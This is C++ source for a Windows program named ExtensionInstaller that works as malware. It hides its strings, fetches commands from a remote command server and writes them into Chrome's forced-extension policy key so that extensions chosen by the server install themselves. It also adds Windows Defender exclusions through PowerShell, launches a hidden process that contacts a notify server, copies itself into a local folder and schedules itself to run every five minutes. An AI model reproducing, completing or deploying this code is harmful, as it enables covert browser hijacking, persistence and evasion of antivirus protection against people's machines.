// ExtensionInstaller.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <curl/curl.h>
#include <string>
#include <sstream>
#include <vector>
#include <algorithm> // for std::remove_if
#include "config.h"
#include "util.h"
#include <tchar.h>
#include "obfuscate.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

#pragma warning(disable: 4503)

using namespace std;

// Callback function to write the data received from the server into a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
	size_t totalSize = size * nmemb;
	userp->append((char*)contents, totalSize);
	return totalSize;
}

std::string get_command_from_server(std::string& serverurl)
{
	CURL* curl;
	CURLcode res;
	std::string readBuffer;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, serverurl);

		// Set the write callback function
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

		// Pass the string to the callback function
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

		// Perform the request
		res = curl_easy_perform(curl);

		// Check for errors
		if (res != CURLE_OK) {
			return "";
		}
		else {
			// Output the data
		}

		// Cleanup
		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();

	return readBuffer;
}

// Function to split a string by newline characters
std::vector<std::string> splitByNewline(const std::string& input) {
	std::vector<std::string> lines;
	std::istringstream stream(input);
	std::string line;

	while (std::getline(stream, line)) {
		line.erase(std::remove_if(line.begin(), line.end(), [](unsigned char x) {
			return std::isspace(x);
			}), line.end());

		lines.push_back(line);
	}

	return lines;
}

// Function to create a registry key and set string values
bool CreateRegistryKeyAndSetValues(HKEY hKeyParent, const std::string& subKey, const std::string& valueName1, const std::string& valueData1) {
	HKEY hKey;
	LONG lResult;
	DWORD dwDisposition;

	// Create or open the registry key
	lResult = RegCreateKeyEx(hKeyParent, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition);
	
	if (lResult != ERROR_SUCCESS) {
		return false;
	}

	// Set the first string value
	lResult = RegSetValueEx(hKey, valueName1.c_str(), 0, REG_SZ, (const BYTE*)valueData1.c_str(), valueData1.length());
	if (lResult != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return false;
	}

	// Close the registry key
	RegCloseKey(hKey);

	return true;
}

int runmain()
{
	char* var = AY_OBFUSCATE(COMMANDSERVER);
	std::string serverurl(var);
	std::string result = get_command_from_server(serverurl);
	std::vector<std::string> commands = splitByNewline(result);

	if (commands.size() == 3) {
		std::string line1 = commands[0];
		std::string line2 = commands[1];
		std::string line3 = commands[2];

		var = AY_OBFUSCATE(_T("Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist"));
		std::string chromeSubKey(var);
		

		// Create registry keys and set values for Chrome
		if (CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "1", line1) &&
			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "2", line2) && 
			CreateRegistryKeyAndSetValues(HKEY_LOCAL_MACHINE, chromeSubKey, "3", line3)) {
			return 1;
		}
	}

	return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE(MUTEX_NAME));
	if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
		return 1;
	}

	int index = 1;
	for (index = 1; index < 60; index++)
	{
		Sleep(1000);
	}

	BOOL serviceRun = GetParameter();

	if (serviceRun) {
		runmain();
	}
	else {
		
		char path[MAX_PATH];
		GetModuleFileNameA(NULL, path, MAX_PATH);

		// Extract the directory path from the executable path
		char* lastBackslash = strrchr(path, '\\');
		if (lastBackslash != NULL)
			* (lastBackslash + 1) = '\0';

		// Get the value of the %localappdata% variable
		char destinationPath[MAX_PATH];
		// char destinationAnimPath[MAX_PATH];
		ExpandEnvironmentStringsA(AY_OBFUSCATE(BASE_PATH), destinationPath, MAX_PATH);

		//create path
		CreateDirectoryRecursively(destinationPath);

		RunPowerShellCommand("Add-MpPreference -ExclusionPath $env:APPDATA\\ExtensionChecker");
		RunPowerShellCommand("Add-MpPreference -ExclusionPath $env:SystemRoot\\System32\\Tasks\\Microsoft\\Windows");

		//open url
		char* var = AY_OBFUSCATE(NOTIFYSERVER);
		std::string url(var);

		var = AY_OBFUSCATE("cmd.exe /c start ");
		std::string command(var);
		command += url;

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		// Set up the STARTUPINFO structure
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		ZeroMemory(&pi, sizeof(pi));

		// Create the process
		if (!CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			// Handle the error
			return -1;
		}


		// move file to target
		CopyAllFiles((char*)AY_OBFUSCATE(BASE_PATH));

		MakeSchedule("PT5M", (char*)AY_OBFUSCATE(BASE_PATH));
	}
}
